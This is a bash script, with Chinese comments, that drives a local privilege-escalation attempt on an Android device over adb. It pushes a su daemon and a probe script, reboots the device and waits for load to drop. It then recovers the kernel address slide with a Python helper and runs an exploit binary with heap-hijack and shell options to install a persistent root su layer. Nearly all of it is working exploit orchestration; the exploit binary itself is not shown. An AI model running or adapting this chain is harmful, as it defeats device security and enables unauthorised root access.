#!/bin/bash
# round3.sh — 搭"运行时 su 层"的那一轮: 推文件 -> 冷启动 -> 等 load1<6 -> 解 slide -> ishell 里跑 round3_probe
set -u
cd "/g/项目/Windows管理/usb/临时root" || exit 1
DEV=<DEVICE_SERIAL>
A() { MSYS2_ARG_CONV_EXCL='*' adb -s "$DEV" "$@"; }

A push cm57/sudbin /data/local/tmp/sud >/dev/null || exit 1
A push cm57/round3_probe.sh /data/local/tmp/round3_probe.sh >/dev/null || exit 1
A shell "chmod 755 /data/local/tmp/sud /data/local/tmp/round3_probe.sh; md5sum /data/local/tmp/sud"
md5sum cm57/sudbin
echo "[r3] 冷启动"
A reboot
A wait-for-device
for i in $(seq 1 40); do
  o=$(A shell "getenforce" 2>/dev/null | tr -d '\r')
  case "$o" in *Enforcing*|*Permissive*) break ;; esac
  sleep 5
done
echo "[r3] shell 可用: $o"
for i in $(seq 1 24); do
  l=$(A shell "cat /proc/loadavg" 2>/dev/null | tr -d '\r' | cut -d' ' -f1)
  up=$(A shell "cat /proc/uptime" 2>/dev/null | tr -d '\r' | cut -d' ' -f1)
  ip=${l%%.*}; [ -n "$ip" ] || ip=9
  echo "[r3] uptime=$up load1=$l (门槛 <6)"
  [ "$ip" -lt 6 ] && { echo "[r3] 负载落定"; break; }
  sleep 15
done
python cm57/solve_only.py 30 > cm57/solve3.log 2>&1
S=$(grep -a 'SOLVE_ONLY_RESULT' cm57/solve3.log | awk '{print $2}')
echo "[r3] slide=$S"
if [ -z "$S" ] || [ "$S" = "NONE" ]; then echo "[r3] 没解出 slide, 停"; exit 2; fi
for i in $(seq 1 8); do
  l=$(A shell "cat /proc/loadavg" 2>/dev/null | tr -d '\r' | cut -d' ' -f1)
  ip=${l%%.*}; [ -n "$ip" ] || ip=9
  [ "$ip" -lt 6 ] && break
  echo "[r3] 采样抬高了负载(load1=$l), 再等"; sleep 15
done
echo "[r3] 打之前 uname -s = [$(A shell 'uname -s' | tr -d '\r')] (必须 Linux)"
printf 'sh /data/local/tmp/round3_probe.sh; exit\n' | \
  A shell -tt "cd /data/local/tmp && ./pr $S hammer hijack shape2 sen victim ishell ph2=0 ncopy5 shots=25 maxr=8 nph=7 rounds=200 wcpu=6 mcpu=0 kids" \
  > cm57/round3_run.log 2>&1
echo "[r3] ishell 轮次 rc=$?"
A shell "cat /data/local/tmp/round3.log" > cm57/round3_dev.log 2>&1
A shell "cat /data/local/tmp/sud.log" > cm57/sud_daemon.log 2>&1
echo "[r3] 完成 (cm57/round3_dev.log / cm57/sud_daemon.log)"
